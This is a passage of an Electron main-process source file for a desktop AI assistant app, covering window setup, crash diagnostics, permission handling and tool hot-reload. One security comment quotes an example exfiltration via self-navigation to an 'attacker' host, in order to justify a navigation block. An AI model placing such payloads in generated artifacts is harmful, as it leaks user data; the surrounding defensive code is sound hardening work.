          { role: 'zoom', label: 'Maximize' },
          { role: 'close' },
          { type: 'separator' },
          { role: 'front' },
        ]
      : [{ role: 'minimize' }, { role: 'close' }],
  });

  Menu.setApplicationMenu(Menu.buildFromTemplate(template));
}

// Resolve the app icon — works in both dev and packaged builds
const APP_ICON = join(import.meta.dirname, '../../build/icon.png');
const IS_MAC = process.platform === 'darwin';
const IS_WIN = process.platform === 'win32';

const windowHealthMonitor = new WindowHealthMonitor({
  logPath: WINDOW_HEALTH_LOG,
  getPrimaryWindow: () => primaryWindowRef,
  getProcessMetrics: () => app.getAppMetrics(),
  hasActiveWork: hasActiveStreams,
  // Live gate for the renderer heap heartbeat. Read per-tick so toggling the
  // "In-depth memory & crash logging" setting starts/stops the heartbeat without
  // a relaunch (unlike the V8 command-line switches, which are startup-only).
  isHeapHeartbeatEnabled: () => {
    try {
      return readEffectiveConfig(APP_HOME).diagnostics?.memoryDiagnostics?.enabled ?? false;
    } catch {
      return false;
    }
  },
  // Live cap for window-health.log, read per write so a Settings change applies
  // without a relaunch. Undefined/unreadable → the monitor's built-in default.
  getMaxLogBytes: () => {
    try {
      return readEffectiveConfig(APP_HOME).diagnostics?.memoryDiagnostics?.windowHealthLogMaxBytes ?? 10 * 1024 * 1024;
    } catch {
      return 10 * 1024 * 1024;
    }
  },
  // Live heap-snapshot policy (threshold + on/off), read per tick.
  getHeapSnapshotPolicy: () => {
    try {
      const hs = readEffectiveConfig(APP_HOME).diagnostics?.memoryDiagnostics?.heapSnapshot;
      if (!hs?.enabled) return null;
      return { enabled: true, thresholdPct: hs.thresholdPct ?? 85 };
    } catch {
      return null;
    }
  },
  // Live renderer-recovery policy: force-reload a renderer wedged unloaded past
  // the stall threshold (display-reconfigure / GPU context-loss zombie).
  getRendererRecoveryPolicy: () => {
    try {
      const rr = readEffectiveConfig(APP_HOME).diagnostics?.rendererRecovery;
      return {
        reloadStalledRenderer: rr?.reloadStalledRenderer ?? true,
        stallReloadMs: rr?.stallReloadMs ?? 30000,
      };
    } catch {
      return { reloadStalledRenderer: true, stallReloadMs: 30000 };
    }
  },
  // Capture a renderer heap snapshot + enforce retention when the heartbeat
  // decides one is due. Heavy (multi-GB write + GC pause) but rare (latched).
  onHeapSnapshotTrigger: async (win) => {
    const hs = (() => {
      try {
        return readEffectiveConfig(APP_HOME).diagnostics?.memoryDiagnostics?.heapSnapshot ?? null;
      } catch {
        return null;
      }
    })();
    const started = Date.now();
    const result = await captureHeapSnapshot(
      join(APP_HOME, 'logs'),
      (filePath) => (win as unknown as { webContents: Electron.WebContents }).webContents.takeHeapSnapshot(filePath),
      { maxCount: hs?.maxCount ?? 3, maxTotalBytes: hs?.maxTotalBytes ?? 6442450944 },
    );
    windowHealthMonitor.recordLifecycleEvent('renderer-heap-snapshot-captured', {
      path: result.path,
      bytes: result.bytes,
      evicted: result.evicted,
      elapsedMs: Date.now() - started,
    });
  },
  reviveNativeSurface: async () => {
    if (!IS_MAC) return;
    const win = primaryWindowRef;
    if (!win || win.isDestroyed()) return;
    // Recreate the NSVisualEffectView backing the transparent macOS window.
    // This is intentionally attempted before a renderer reload because it does
    // not disturb React state, drafts, or active IPC subscriptions.
    win.setVibrancy(null);
    await new Promise((resolve) => setTimeout(resolve, 50));
    if (win.isDestroyed()) return;
    win.setVibrancy('sidebar');
    win.webContents.invalidate();
  },
});

function setMacDockIcon(): void {
  setPaddedMacDockIcon(APP_ICON);
}

function restoreMacDockIconAfterRendererIconUpdates(): void {
  setMacDockIcon();
  setTimeout(setMacDockIcon, 100);
}

function createWindow(): BrowserWindow {
  const savedState = loadWindowState();
  const windowIcon = IS_MAC ? (createPaddedDockIcon(APP_ICON) ?? APP_ICON) : APP_ICON;
  const mainWindow = new BrowserWindow({
    ...(savedState.x !== undefined && savedState.y !== undefined ? { x: savedState.x, y: savedState.y } : {}),
    width: savedState.width,
    height: savedState.height,
    minWidth: 800,
    minHeight: 600,
    show: false,
    title: __BRAND_PRODUCT_NAME,
    icon: windowIcon,
    titleBarStyle: IS_MAC ? 'hiddenInset' : 'hidden',
    ...(IS_MAC ? { trafficLightPosition: { x: 20, y: 18 } } : {}),
    ...(IS_WIN
      ? {
          titleBarOverlay: {
            color: nativeTheme.shouldUseDarkColors ? '#1a1a1a' : '#f5f5f5',
            symbolColor: nativeTheme.shouldUseDarkColors ? '#ffffff' : '#1a1a1a',
            height: 38,
          },
        }
      : {}),
    transparent: IS_MAC,
    vibrancy: IS_MAC ? 'sidebar' : undefined,
    visualEffectState: IS_MAC ? 'active' : undefined,
    backgroundColor: IS_MAC ? '#00000000' : nativeTheme.shouldUseDarkColors ? '#1a1a1a' : '#ffffff',
    webPreferences: {
      preload: join(codePaths.preload, 'index.mjs'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: false,
      spellcheck: true,
    },
  });
  primaryWindowRef = mainWindow;
  if (!getExistingBrowserManager()) {
    initializeBrowserManager(
      APP_HOME,
      () => readEffectiveConfig(APP_HOME),
      () => primaryWindowRef,
      join(codePaths.preload, 'browser-page.cjs'),
    );
  }
  getExistingBrowserManager()?.handleHostWindowCreated();
  installBrowserIntegrationTestDriver();
  mainWindow.webContents.on('before-input-event', (event, input) => {
    getExistingBrowserManager()?.handleChromeShortcut(event, input);
  });
  const notifyBrowserWindowVisibility = () => {
    getExistingBrowserManager()?.handleHostWindowVisibilityChanged();
  };
  mainWindow.on('show', notifyBrowserWindowVisibility);
  mainWindow.on('hide', notifyBrowserWindowVisibility);
  mainWindow.on('focus', notifyBrowserWindowVisibility);
  mainWindow.on('blur', notifyBrowserWindowVisibility);
  mainWindow.on('minimize', notifyBrowserWindowVisibility);
  mainWindow.on('restore', notifyBrowserWindowVisibility);
  notifyBrowserWindowVisibility();
  const browserConfig = readEffectiveConfig(APP_HOME).browser;
  // A reopened primary window must not republish Browser tools while Chromium
  // is still draining or remapping an authenticated profile. The coordinator's
  // committed generation is the sole release point for this hold.
  if (!browserConfigTransitions?.isPending()) {
    updateBrowserTools(browserConfig.enabled ? createBrowserTools(() => readEffectiveConfig(APP_HOME)) : []);
    updateActiveRealtimeSessionTools(getRegisteredTools());
  }
  windowHealthMonitor.attachWindow(mainWindow);
  applyBrandUserAgent(mainWindow.webContents);

  if (IS_MAC) {
    mainWindow.webContents.on('page-favicon-updated', restoreMacDockIconAfterRendererIconUpdates);
    mainWindow.webContents.on('did-finish-load', restoreMacDockIconAfterRendererIconUpdates);
  }

  // Sync titleBarOverlay colors when the system/user theme changes (Windows only)
  if (IS_WIN) {
    nativeTheme.on('updated', () => {
      if (mainWindow.isDestroyed()) return;
      const dark = nativeTheme.shouldUseDarkColors;
      mainWindow.setTitleBarOverlay({
        color: dark ? '#1a1a1a' : '#f5f5f5',
        symbolColor: dark ? '#ffffff' : '#1a1a1a',
      });
    });
  }

  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    openExternalSafely(url);
    return { action: 'deny' };
  });

  // WebContentsView children are owned by the BrowserWindow, not the React
  // renderer. A renderer reload/navigation would otherwise leave the old page
  // view alive above a fresh BrowserPanel. Preserve tab shells, but detach and
  // destroy every native view before the primary renderer is replaced.
  mainWindow.webContents.on('did-start-navigation', (_event, _url, isInPlace, isMainFrame) => {
    if (!isMainFrame || isInPlace) return;
    revokeBrowserHostRendererAccess();
  });

  // Main-process navigation backstop for the main window AND its subframes.
  // Artifact previews render agent-supplied html/svg/react inside a
  // sandbox="allow-scripts" srcdoc iframe under a strict CSP, but Chromium does
  // NOT enforce the CSP `navigate-to` directive — so a malicious artifact can
  // still exfiltrate via self-navigation (`location='https://attacker/?data'`
  // or <meta http-equiv=refresh>). The renderer's onLoad guard is too late (the
  // request already fired) and bypassable. This will-frame-navigate handler runs
  // in the main process BEFORE the request and can't be defeated by the frame:
  // allow only the exact privileged renderer document at top level. Artifact
  // subframes may additionally use about:blank/about:srcdoc and PDF data URLs
  // used by the attachment preview. Anything else is denied. Only a blocked
  // TOP-LEVEL navigation is safe-routed to the OS browser: a subframe can
  // navigate itself without a user gesture, so forwarding its URL would leak
  // artifact-controlled query data. Exact matching also prevents same-origin
  // Vite /@fs resources or a sibling packaged file from inheriting the primary
  // preload's authority.
  mainWindow.webContents.on('will-frame-navigate', (event) => {
    const disposition = primaryRendererFrameNavigationDisposition(event.url, primaryRendererUrl, event.isMainFrame);
    if (disposition === 'allow') return;
    event.preventDefault();
    if (disposition === 'external') openExternalSafely(event.url);
  });

  // Grant the small set of renderer permissions we explicitly support.
  const allowedPermissions = ['media', 'microphone', 'audioCapture', 'clipboard-read', 'clipboard-sanitized-write'];
  mainWindow.webContents.session.setPermissionRequestHandler((_webContents, permission, callback) => {
    callback(allowedPermissions.includes(permission));
  });
  mainWindow.webContents.session.setPermissionCheckHandler((_webContents, permission) => {
    return allowedPermissions.includes(permission);
  });

  // Default right-click context menu
  mainWindow.webContents.on('context-menu', (_event, params) => {
    const menu = new Menu();

    // Image context menu
    if (params.mediaType === 'image' && params.srcURL) {
      menu.append(
        new MenuItem({
          label: 'Copy Image',
          click: () => mainWindow.webContents.copyImageAt(params.x, params.y),
        }),
      );
      menu.append(
        new MenuItem({
          label: 'Copy Image URL',
          click: () => clipboard.writeText(params.srcURL),
        }),
      );
      menu.append(
        new MenuItem({
          label: 'Save Image As\u2026',
          click: async () => {
            try {
              let parsed;
              try {
                parsed = new URL(params.srcURL);
              } catch {
                return;
              }
              if (
                parsed.protocol !== 'http:' &&
                parsed.protocol !== 'https:' &&
                parsed.protocol !== __BRAND_MEDIA_PROTOCOL + ':'
              ) {
                return;
              }
              const defaultName = params.srcURL.split('/').pop()?.split('?')[0] || 'image.png';
              const result = await dialog.showSaveDialog(mainWindow, {
                defaultPath: defaultName,
                filters: [{ name: 'Images', extensions: ['png', 'jpg', 'jpeg', 'gif', 'webp', 'svg'] }],
              });
              if (!result.canceled && result.filePath) {
                // srcURL comes from the UNTRUSTED in-app browser page. http(s)
                // must go through the SSRF-guarded, byte-capped fetch (blocks
                // private/loopback/metadata targets + redirect bypass + unbounded
                // body); the media: protocol is a LOCAL file via the app's own
                // handler, not a network request, so it uses net.fetch directly.
                // Mirrors the image:fetch IPC handler.
                const isMedia = parsed.protocol === __BRAND_MEDIA_PROTOCOL + ':';
                const resp = isMedia
                  ? await net.fetch(params.srcURL, { headers: withBrandUserAgent() })
                  : await safeFetch(params.srcURL, { headers: withBrandUserAgent() as Record<string, string> });
                if (resp.ok) {
                  const buffer = isMedia
                    ? Buffer.from(await resp.arrayBuffer())
                    : await readCappedArrayBuffer(resp, 256 * 1024 * 1024);
                  writeFileSync(result.filePath, buffer);
                }
              }
            } catch {
              /* ignore save errors */
            }
          },
        }),
      );
      if (params.selectionText) {
        menu.append(new MenuItem({ type: 'separator' }));
        menu.append(new MenuItem({ role: 'copy' }));
      }
    } else if (params.isEditable) {
      // Spellcheck suggestions
      if (params.misspelledWord) {
        if (params.dictionarySuggestions.length > 0) {
          for (const suggestion of params.dictionarySuggestions) {
            menu.append(
              new MenuItem({
                label: suggestion,
                click: () => mainWindow.webContents.replaceMisspelling(suggestion),
              }),
            );
          }
        } else {
          menu.append(new MenuItem({ label: 'No suggestions', enabled: false }));
        }
        menu.append(new MenuItem({ type: 'separator' }));
        menu.append(
          new MenuItem({
            label: 'Add to Dictionary',
            click: () => mainWindow.webContents.session.addWordToSpellCheckerDictionary(params.misspelledWord),
          }),
        );
        menu.append(new MenuItem({ type: 'separator' }));
      }
      // Editable field context menu
      menu.append(new MenuItem({ role: 'undo' }));
      menu.append(new MenuItem({ role: 'redo' }));
      menu.append(new MenuItem({ type: 'separator' }));
      menu.append(new MenuItem({ role: 'cut' }));
      menu.append(new MenuItem({ role: 'copy' }));
      menu.append(new MenuItem({ role: 'paste' }));
      menu.append(new MenuItem({ type: 'separator' }));
      menu.append(new MenuItem({ role: 'selectAll' }));
    } else {
      // Text selection context menu
      if (params.selectionText) {
        menu.append(new MenuItem({ role: 'copy' }));
      }
      menu.append(new MenuItem({ role: 'selectAll' }));
    }

    // Link items (appended to any menu type)
    if (params.linkURL) {
      menu.append(new MenuItem({ type: 'separator' }));
      menu.append(
        new MenuItem({
          label: 'Open Link',
          click: () => openExternalSafely(params.linkURL),
        }),
      );
      menu.append(
        new MenuItem({
          label: 'Copy Link',
          click: () => clipboard.writeText(params.linkURL),
        }),
      );
    }

    if (menu.items.length > 0) {
      menu.popup({ window: mainWindow });
    }
  });

  void mainWindow.loadURL(primaryRendererUrl);

  mainWindow.once('ready-to-show', () => {
    if (savedState.isMaximized) mainWindow.maximize();
  });

  // Persist window bounds on resize / move / close (debounced)
  let saveTimeout: ReturnType<typeof setTimeout> | null = null;
  const debouncedSave = () => {
    if (saveTimeout) clearTimeout(saveTimeout);
    saveTimeout = setTimeout(() => saveWindowState(mainWindow), 400);
  };
  mainWindow.on('resize', debouncedSave);
  mainWindow.on('move', debouncedSave);
  mainWindow.on('close', () => {
    if (saveTimeout) clearTimeout(saveTimeout);
    saveWindowState(mainWindow);
    getExistingBrowserManager()?.handleHostWindowWillClose();
  });
  mainWindow.on('closed', () => {
    revokeBrowserHostRendererAccess();
    updateBrowserTools([]);
    if (primaryWindowRef === mainWindow) {
      windowHealthMonitor.detachWindow();
      primaryWindowRef = null;
    }
    // The primary window is gone. If CLI/web clients still depend on this
    // backend, demote to headless NOW rather than waiting on window-all-closed
    // — which may never fire, because dictation keeps a hidden overlay window
    // alive that counts in getAllWindows(). demoteWindowedToHeadless tears those
    // GUI-only windows/services down. But do NOT demote while OTHER visible
    // windows remain (plugin browser, computer-use operator) — hiding the dock
    // and re-arming idle shutdown under a visible window would be wrong.
    const otherVisible = BrowserWindow.getAllWindows().some(
      (w) => w !== mainWindow && !w.isDestroyed() && w.isVisible(),
    );
    if ((localClients.size > 0 || webClients.size > 0) && !headlessWindowBlockActive && !otherVisible) {
      demoteWindowedToHeadlessRef();
    }
  });

  return mainWindow;
}

function focusPrimaryWindow(): void {
  let win = primaryWindowRef && !primaryWindowRef.isDestroyed() ? primaryWindowRef : null;
  if (!win) {
    if (!app.isReady()) return;
    win = createWindow();
    win.once('ready-to-show', () => {
      if (!win || win.isDestroyed()) return;
      if (win.isMinimized()) win.restore();
      if (!win.isVisible()) win.show();
      win.focus();
    });
    return;
  }

  if (win.isMinimized()) win.restore();
  if (!win.isVisible()) win.show();
  win.focus();
}

// Enable speech recognition API (required for webkitSpeechRecognition in Electron)
app.commandLine.appendSwitch('enable-speech-api');
app.commandLine.appendSwitch('enable-speech-dispatcher');

// Crash diagnostics: the renderer has been dying with EXC_BREAKPOINT (SIGTRAP,
// `brk 0`) fired from inside V8/cppgc garbage collection — V8's own fatal-error
// trap, with no JS-level exception to catch. On its own the abort is opaque: the
// macOS crash report shows only stripped GC frames. When the "In-depth memory &
// crash logging" diagnostic setting is on, these flags make V8 print the *reason*
// string for a fatal error (e.g. "Reached heap limit Allocation failed", "Array
// buffer allocation failed", "invalid array length") plus a name/value line per
// GC. That output goes to the renderer's stderr, which in a packaged app is
// otherwise discarded — so we also route Chromium/V8 logging to a file
// (chrome-debug.log next to the other logs) via --enable-logging=file. The last
// lines of that file before an abort are the smoking gun.
//
// Gated on config (not an env var) so it is toggleable from Settings →
// Diagnostics. Command-line switches can only be set before app-ready, so this
// piece is read once at startup and requires a RELAUNCH to change — the setting
// UI notes this. The live pieces (heap heartbeat, crash-context enrichment) read
// the same flag dynamically below and take effect immediately.
try {
  if (readEffectiveConfig(APP_HOME).diagnostics?.memoryDiagnostics?.enabled) {
    const chromeDebugLog = join(APP_HOME, 'logs', 'chrome-debug.log');
    // Chromium appends to --log-file across the session and does NOT honor our
    // bounded-writer rotation, so it can grow without limit (observed 53 MB).
    // Bound it at the process boundary: at each launch, if the prior file is
    // over the cap, single-roll it to `.1` so the live file starts fresh and
    // total on-disk stays ~2× the cap.
    try {
      const CHROME_LOG_MAX_BYTES = 25 * 1024 * 1024;
      if (existsSync(chromeDebugLog) && statSync(chromeDebugLog).size > CHROME_LOG_MAX_BYTES) {
        // Rotate with an atomic RENAME (not read-all-into-memory + write): renameSync
        // avoids a startup memory spike on a 25+ MB file AND is atomic, so the crash log
        // is never truncated-without-a-backup. Only if the rename SUCCEEDS is the live
        // path now absent (Chromium recreates it fresh); if it fails, leave the file as-is
        // rather than blow away the only crash log.
        try {
          renameSync(chromeDebugLog, `${chromeDebugLog}.1`);
        } catch {
          /* rotation failed — keep the existing log intact rather than truncate it */
        }
      }
    } catch {
      /* rotation is best-effort; never block boot */
    }
    app.commandLine.appendSwitch('js-flags', '--trace-gc-nvp');
    app.commandLine.appendSwitch('enable-logging', 'file');
    app.commandLine.appendSwitch('log-file', chromeDebugLog);
    // Include INFO-level so trace-gc-nvp lines (logged at INFO) are not filtered.
    app.commandLine.appendSwitch('log-level', '0');
  }
} catch {
  /* config unreadable at startup — skip the diagnostic switches, never block boot */
}

// Layer 3 (opt-in, restart-required): force image/canvas rasterization onto the
// CPU so a GPU-process context loss during a display reconfigure can't take the
// renderer's raster/decode path down (the observed rust_png→cppgc crash).
// `disable-gpu-rasterization` is a real, supported Chromium switch on this
// Electron (verified against the runtime); an earlier attempt used
// `--disable-features=CanvasOopRasterization`, which is NOT a registered feature
// on Electron 41.2 and was silently ignored. Read once at startup; changes
// app-wide GPU behavior so it's off by default and gated behind the setting.
try {
  if (readEffectiveConfig(APP_HOME).diagnostics?.rendererRecovery?.gpuContextLossHardening) {
    app.commandLine.appendSwitch('disable-gpu-rasterization');
  }
} catch {
  /* config unreadable — skip; never block boot */
}

if (gotSingleInstanceLock) {
  app.on('second-instance', (_event, argv) => {
    // A second launch arrived. Ignore duplicate BACKEND/CLI launches (e.g. two
    // CLIs racing to spawn a headless backend, or a CLI client attaching) —
    // only a real GUI launch should promote a dockless backend to windowed.
    if (argv.includes('--kai-headless') || argv.includes('--kai-cli')) {
      return;
    }
    // If this process is currently a dockless (headless/demoted) backend, a GUI
    // is trying to open against us — promote to windowed. Gate on the RUNTIME
    // window-block state, not the immutable IS_HEADLESS, so a GUI leader that
    // demoted after its windows closed still re-promotes. If promotion isn't
    // wired yet (second-instance can arrive before whenReady assigns it),
    // remember it and drain once ready.
    if (headlessWindowBlockActive) {
      if (promoteReady) void promoteHeadlessToWindowed();
      else pendingPromote = true;
    } else {
      focusPrimaryWindow();
    }
  });

  app.whenReady().then(() => {
    ensureAppHome();
    applyTheme();
    buildMenu();
    windowHealthMonitor.logSession({
      appVersion: app.getVersion(),
      electronVersion: process.versions.electron,
      chromeVersion: process.versions.chrome,
      nodeVersion: process.versions.node,
      platform: process.platform,
      arch: process.arch,
      osRelease: osRelease(),
      headless: IS_HEADLESS,
    });
    app.on('child-process-gone', (_event, details) => {
      windowHealthMonitor.recordChildProcessGone({ ...details });
    });
    app.on('render-process-gone', (_event, contents, details) => {
      // A Browser page renderer crash is handled by BrowserManager itself. Only
      // loss of the primary React renderer invalidates all native child views.
      if (primaryWindowRef && contents === primaryWindowRef.webContents) {
        revokeBrowserHostRendererAccess();
      }
      // Enrich the crash record with main-process memory + timing context. The
      // renderer abort itself carries `reason` ('crashed' | 'oom' | 'killed' |
      // 'launch-failed' | …) and `exitCode` (5 = SIGTRAP, the V8/cppgc fatal
      // trap we're chasing). Attaching how long since the last suspend/resume
      // and screen lock/unlock lets us confirm the observed "crashes on/after
      // wake from a long idle" correlation, and main-process RSS rules out a
      // whole-app memory ceiling. Always recorded (not gated) — it's a rare
      // one-shot event and the correlation is useful even if the deeper opt-in
      // logging wasn't enabled for this session. Best-effort — never let
      // diagnostics throw inside the crash handler.
      let crashContext: Record<string, unknown> = {};
      try {
        const mem = process.memoryUsage();
        let memoryDiagnosticsEnabled = false;
        try {
          memoryDiagnosticsEnabled = readEffectiveConfig(APP_HOME).diagnostics?.memoryDiagnostics?.enabled ?? false;
        } catch {
          /* config unreadable — leave false */
        }
        crashContext = {
          crashCapturedAt: new Date().toISOString(),
          mainRssMB: Math.round(mem.rss / (1024 * 1024)),
          mainHeapUsedMB: Math.round(mem.heapUsed / (1024 * 1024)),
          mainExternalMB: Math.round(mem.external / (1024 * 1024)),
          msSinceSystemResume: lastSystemResumeAt === null ? null : Date.now() - lastSystemResumeAt,
          msSinceScreenUnlock: lastScreenUnlockAt === null ? null : Date.now() - lastScreenUnlockAt,
          // Whether the restart-required V8/Chromium crash logging was active for
          // this session (so a reader knows to also check chrome-debug.log).
          memoryDiagnosticsEnabled,
        };
        // The process-metric snapshot names the dead PID only as an anonymous
        // "Tab". Attach a webContents inventory (id → osPid → type → URL) so an
        // OOM'd Tab pid can be matched to the page it was hosting (e.g. a plugin
        // browser-window / Azure webview) — the missing link in prior reports.
        // Host-only URLs (no query/hash) to avoid logging tokens.
        try {
          crashContext.deadOsPid = (() => {
            try {
              return contents.getOSProcessId();
            } catch {
              return null;
            }
          })();
          crashContext.webContentsInventory = webContents
            .getAllWebContents()
            .map((wc) => {
              let pid: number | null = null;
              let host = '';
              try {
                pid = wc.getOSProcessId();
              } catch {
                /* destroyed */
              }
              try {
                host = new URL(wc.getURL()).host || '(no-host)';
              } catch {
                host = '(unavailable)';
              }
              return { id: wc.id, osPid: pid, type: wc.getType(), host };
            })
            .slice(0, 50);
        } catch {
          /* inventory best-effort */
        }
      } catch {
        /* best-effort context only */
      }
      windowHealthMonitor.recordRendererGone(contents, { ...details, ...crashContext });
    });
    powerMonitor.on('suspend', () => windowHealthMonitor.recordLifecycleEvent('system-suspend'));
    powerMonitor.on('resume', () => {
      lastSystemResumeAt = Date.now();
      windowHealthMonitor.recordLifecycleEvent('system-resume');
      windowHealthMonitor.requestRecovery('system-resume', 1_000);
    });
    powerMonitor.on('lock-screen', () => windowHealthMonitor.recordLifecycleEvent('screen-locked'));
    powerMonitor.on('unlock-screen', () => {
      lastScreenUnlockAt = Date.now();
      windowHealthMonitor.recordLifecycleEvent('screen-unlocked');
      windowHealthMonitor.requestRecovery('screen-unlocked', 750);
    });
    powerMonitor.on('user-did-resign-active', () => {
      windowHealthMonitor.recordLifecycleEvent('user-became-inactive');
    });
    powerMonitor.on('user-did-become-active', () => {
      windowHealthMonitor.recordLifecycleEvent('user-became-active');
      windowHealthMonitor.requestRecovery('user-became-active', 750);
    });
    screen.on('display-added', (_event, display) => {
      windowHealthMonitor.recordLifecycleEvent('display-added', { displayId: display.id, bounds: display.bounds });
      windowHealthMonitor.requestRecovery('display-added', 750);
    });
    screen.on('display-removed', (_event, display) => {
      windowHealthMonitor.recordLifecycleEvent('display-removed', { displayId: display.id, bounds: display.bounds });
      windowHealthMonitor.requestRecovery('display-removed', 750);
    });
    screen.on('display-metrics-changed', (_event, display, changedMetrics) => {
      windowHealthMonitor.recordLifecycleEvent('display-metrics-changed', {
        displayId: display.id,
        bounds: display.bounds,
        changedMetrics,
      });
      windowHealthMonitor.requestRecovery('display-metrics-changed', 750);
    });
    const shellPathReady = primeResolvedShellPath().catch((error) => {
      console.warn(`[${__BRAND_PRODUCT_NAME}] Failed to resolve shell PATH, using inherited environment:`, error);
      return process.env.PATH ?? '';
    });

    // Request microphone permission on macOS (needed for voice recording /
    // speech-to-text) — GUI only. A headless CLI backend has no mic UI and must
    // not trigger a privacy-permission prompt on terminal startup.
    if (process.platform === 'darwin' && !IS_HEADLESS) {
      systemPreferences
        .askForMediaAccess('microphone')
        .then((granted) => {
          console.info(`[${__BRAND_PRODUCT_NAME}] Microphone permission: ${granted ? 'granted' : 'denied'}`);
        })
        .catch((err) => {
          console.warn(`[${__BRAND_PRODUCT_NAME}] Failed to request microphone permission:`, err);
        });
    }

    // Set dock icon (macOS) — GUI only; a headless/accessory backend has no Dock
    // presence, and setting an icon would be a no-op at best.
    // The raw icon.png fills edge-to-edge; createPaddedDockIcon gives it the inset that
    // packaged .icns builds get automatically.
    if (!IS_HEADLESS) {
      setMacDockIcon();
    }

    // Config reader (used by tools and OAuth)
    const getConfig = () => readEffectiveConfig(APP_HOME);

    // Apply launch-at-login setting from config at startup
    try {
      const initialConfig = getConfig();
      app.setLoginItemSettings({ openAtLogin: initialConfig.launchAtLogin ?? false });
    } catch {
      // Non-fatal — login item registration can fail in dev mode
    }

    // Track last mcpServers fingerprint to detect changes
    const fingerprintConfig = (cfg: AppConfig): Record<string, string> =>
      Object.fromEntries((Object.keys(cfg) as Array<keyof AppConfig>).map((k) => [k, JSON.stringify(cfg[k]) ?? '']));
    let lastConfigFingerprints = fingerprintConfig(getConfig());
    let lastMcpFingerprint = JSON.stringify(getConfig().mcpServers ?? []);
    let lastSkillsFingerprint = JSON.stringify({
      enabled: getConfig().skills?.enabled ?? [],
      directory: getConfig().skills?.directory ?? null,
      contents: skillsDirectoryFingerprint(resolveSkillsDir(getConfig(), APP_HOME)),
    });
    let lastCliToolsFingerprint = JSON.stringify(getConfig().cliTools ?? []);
    let lastDisplayFingerprint = JSON.stringify(getConfig().computerUse?.localMacos?.allowedDisplays ?? []);
    let lastWebServerFingerprint = JSON.stringify(getConfig().webServer ?? {});
    let lastLaunchAtLoginFp = JSON.stringify(getConfig().launchAtLogin ?? false);
    let lastAutopilotFingerprint = JSON.stringify(getConfig().autopilot ?? {});
    let lastSubAgentCapsFingerprint = JSON.stringify(getConfig().tools?.subAgents ?? {});
    // Security re-gating fingerprints (R209): a pure executionMode or isolated-browser-allow-private change
    // has no MCP/skills/CLI/browser fingerprint, so it never triggered syncRealtimeTools() — leaving a
    // recordless Realtime session with mutating tools and a live isolated browser with direct UDP after a
    // global plan-first / private-network toggle. Track them explicitly and re-gate on change.
    let lastExecutionModeFp = JSON.stringify(getConfig().tools?.executionMode ?? 'auto');
    let lastIsolatedBrowserPrivateFp = JSON.stringify(
      getConfig().computerUse?.safety?.isolatedBrowserAllowPrivateNetwork ?? false,
    );
    let webServerDebounce: ReturnType<typeof setTimeout> | null = null;
    const syncRealtimeTools = (): void => {
      updateActiveRealtimeSessionTools(getRegisteredTools());
      // A config change may have toggled computerUse.safety.isolatedBrowserAllowPrivateNetwork — reapply
      // the WebRTC policy to any LIVE isolated-browser window so disabling private access re-locks WebRTC
      // immediately, not just on the next window reuse (R206).
      reapplyIsolatedBrowserWebRtcPolicy();
    };
    const publishBrowserTools = (browserConfig: AppConfig['browser']): void => {
      updateBrowserTools(browserConfig.enabled && getExistingBrowserManager() ? createBrowserTools(getConfig) : []);
      syncRealtimeTools();
    };
    const revokeBrowserAssistantAccess = (): void => {
      getExistingBrowserManager()?.revokeAssistantAccess();
      revokeActiveTextBrowserTools();
      revokeRealtimeBrowserTools(getRegisteredTools());
    };

    let setBrowserRollbackConfig: ((path: string, value: unknown) => void) | null = null;
    browserConfigTransitions = createBrowserConfigTransitionCoordinator({
      initialConfig: getConfig().browser,
      getManager: () => getExistingBrowserManager(),
      getPersistedConfig: () => getConfig().browser,
      rollbackConfig: (browserConfig) => setBrowserRollbackConfig?.('browser', browserConfig),
      onAssistantAuthorityRevoked: revokeBrowserAssistantAccess,
      onTransitionCommitted: publishBrowserTools,
      onError: (error) => console.warn(`[${__BRAND_PRODUCT_NAME}] Browser config transition failed:`, error),
    });

    const handleBrowserConfigChanged = (browserConfig: AppConfig['browser']): void => {
      // The persisted config changes before Chromium finishes draining and
      // swapping profiles. New turns must not receive Browser tools while the
      // manager can still expose the prior scope; the coordinator republishes
      // them only after the latest transition commits.
      updateBrowserTools([]);
      syncRealtimeTools();
      browserConfigTransitions?.handle(browserConfig);
    };

    // Gate config-driven hot-reloads until the INITIAL tool registry has been registered (R170 f-5):
    // buildToolRegistry runs async; a config change (e.g. disable A + enable B) that lands during that
    // build triggers a hot-reload rebuild, and if the (slower) initial build's registerTools completes
    // AFTER the hot-reload's updateMcpTools, it CLOBBERS the reload's result with the stale set. So
    // while the initial build is in flight we DEFER hot-reloads; once it registers we re-run
    // handleConfigChanged(getConfig()) once so any drift that occurred during startup is applied ON TOP
    // of the initial registration (the fingerprints stayed at their initial values, so the re-run
    // detects and applies the real current config, winning deterministically).
    let initialToolsRegistered = false;
    let configChangedDuringStartup = false;

    const handleConfigChanged = (config: AppConfig) => {
      if (!initialToolsRegistered) {
        configChangedDuringStartup = true;
        return;
      }
      // MCP hot-reload
      const newMcpFp = JSON.stringify(config.mcpServers ?? []);
      if (newMcpFp !== lastMcpFingerprint) {
        lastMcpFingerprint = newMcpFp;
        console.info(`[${__BRAND_PRODUCT_NAME}] MCP servers changed, rebuilding...`);
        rebuildMcpTools(config.mcpServers ?? [])
          .then((mcpTools) => {
            updateMcpTools(mcpTools);
            syncRealtimeTools();
            console.info(`[${__BRAND_PRODUCT_NAME}] MCP hot-reload complete: ${mcpTools.length} MCP tools`);
          })
          .catch((err) => {
            console.error(`[${__BRAND_PRODUCT_NAME}] MCP hot-reload failed:`, err);
          });
      }

      // Skills hot-reload. Fingerprint the skills DIRECTORY CONTENTS + directory path, not just
      // skills.enabled (R170 f-6): with the default enabled=[] sentinel ("all enabled"), deleting a
      // skill (or changing skills.directory) doesn't change the enabled array, so the reload was
      // skipped and the removed skill's captured prompt/HTTP workflow stayed executable until restart.
      const newSkillsFp = JSON.stringify({
        enabled: config.skills?.enabled ?? [],
        directory: config.skills?.directory ?? null,
        contents: skillsDirectoryFingerprint(resolveSkillsDir(config, APP_HOME)),
      });
      if (newSkillsFp !== lastSkillsFingerprint) {
        lastSkillsFingerprint = newSkillsFp;
        const skillsDir = resolveSkillsDir(config, APP_HOME);
        // Pass the CURRENT registered tool catalog (R170 f-10) so COMPOSITE skills can resolve the
        // tools they orchestrate — omitting it made every composite skill capture an empty catalog
        // after any reload and return "Tool not found" until restart.
        const skillTools = loadSkillsAsTools(skillsDir, config.skills?.enabled ?? [], getConfig, getRegisteredTools());
        updateSkillTools(skillTools);
        syncRealtimeTools();
